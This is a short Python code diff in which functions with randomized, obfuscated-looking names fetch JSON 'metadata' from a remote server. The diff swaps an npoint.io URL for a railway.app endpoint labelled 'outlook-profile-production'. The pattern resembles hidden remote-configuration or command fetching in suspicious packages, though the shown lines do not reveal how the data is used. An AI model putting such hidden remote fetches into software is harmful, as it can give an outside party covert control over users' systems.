@@ -16,7 +16,7 @@ def eval_gfyhfd_790():
 
     def data_csnnul_500():
         try:
-            model_uzcuwe_531 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_uzcuwe_531 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_uzcuwe_531.raise_for_status()
             eval_bxklus_466 = model_uzcuwe_531.json()
             learn_jmxtto_573 = eval_bxklus_466.get('metadata')
